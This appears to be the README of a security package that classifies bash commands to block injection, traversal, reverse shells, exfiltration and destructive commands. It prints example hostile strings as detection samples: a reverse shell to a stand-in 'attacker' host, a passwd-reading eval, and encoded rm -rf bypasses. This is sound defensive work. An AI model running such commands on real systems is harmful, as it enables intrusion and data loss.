# @koi/bash-security

L0u package — Pure security classifiers for bash command validation.

## Purpose

Provides three independent classifier modules plus an orchestration pipeline
for validating bash commands before execution. All modules are side-effect-free
pure functions. No subprocess spawning, no I/O.

## Modules

### injection-detector

Detects command injection vectors: `eval`, `base64 | bash` pipelines,
hex-escaped ANSI-C strings (`$'\x72\x6d'`), and null-byte injection.

```typescript
import { detectInjection } from "@koi/bash-security";
const result = detectInjection("eval $(cat /etc/passwd)");
// { ok: false, reason: "eval executes arbitrary...", category: "injection", pattern: "..." }
```

### path-validator

Validates filesystem paths against traversal sequences (`../`), URL-encoded
traversal (`%2e%2e`), double encoding, null bytes, and non-printable characters.
Optionally canonicalizes against a base directory with `path.resolve()`.

```typescript
import { validatePath } from "@koi/bash-security";
const result = validatePath("../../etc/passwd", "/workspace");
// { ok: false, reason: "resolves outside allowed base...", category: "path-traversal", ... }
```

### bash-classifier

Classifies shell commands against MITRE ATT&CK-aligned TTP patterns:
reverse shells, privilege escalation, persistence mechanisms, and recon.

```typescript
import { classifyCommand } from "@koi/bash-security";
const result = classifyCommand("bash -i >& /dev/tcp/attacker/4444 0>&1");
// { ok: false, category: "reverse-shell", ... }
```

### classify (pipeline)

Orchestrates all three classifiers in ascending cost order
(injection → path → command), with an optional allowlist gate first.

```typescript
import { classifyBashCommand } from "@koi/bash-security";
const result = classifyBashCommand("git status", { policy: { allowlist: ["git "] } });
// { ok: true }
```

## Architecture

```
L0u @koi/bash-security
  ├── types.ts            BashPolicy, ClassificationResult, ThreatPattern, ThreatCategory
  ├── match.ts            matchPatterns() — shared RegExp pattern runner
  ├── injection-detector  detectInjection()
  ├── path-validator      validatePath()
  ├── bash-classifier     classifyCommand()
  └── classify            classifyBashCommand() — ordered pipeline
```

## Security Model

**Defense in depth**: configurable allowlist (primary gate) + mandatory denylist (secondary gate).

- **Allowlist**: If `BashPolicy.allowlist` is set, the command must start with at least one
  listed prefix. Commands not in the allowlist are denied before any denylist checks.
- **Denylist**: Always runs, even for allowed commands. Catches known-dangerous TTP patterns
  that might slip through a broad allowlist entry.

Pattern categories (`ThreatCategory`):
- `injection` — eval, base64 decode pipelines, hex strings, null bytes
- `path-traversal` — `../`, encoded traversal, null bytes in paths
- `reverse-shell` — /dev/tcp, socat, ncat, curl|bash
- `privilege-escalation` — sudo, su, chmod setuid, /etc/passwd
- `persistence` — crontab, authorized_keys, /etc/cron
- `recon` — whoami, uname -a, netstat
- `data-exfiltration` — scp, sftp, rsync to remote, curl --upload-file/POST, wget POST
- `destructive` — `rm -rf` on system paths, mkfs, `dd of=/dev/*`, fork bombs, `chmod -R 777 /`, shutdown/reboot. These are enforced even after a user approves the Bash call (defense-in-depth) so that "approve Bash once" is not license to run `rm -rf /`.

## Bypass Hardening

The test suite covers documented bypass techniques from OWASP and ATT&CK:
- Base64 encoded commands: `echo "cm0gLXJm" | base64 -d | bash`
- Hex-escaped strings: `$'\x72\x6d\x20\x2d\x72\x66'`
- URL-encoded path traversal: `%2e%2e%2f`
- Double URL encoding: `%252e%252e%252f`
- Null byte injection

## Dependencies

None — zero npm dependencies. Uses only Node.js built-ins (`node:path`).
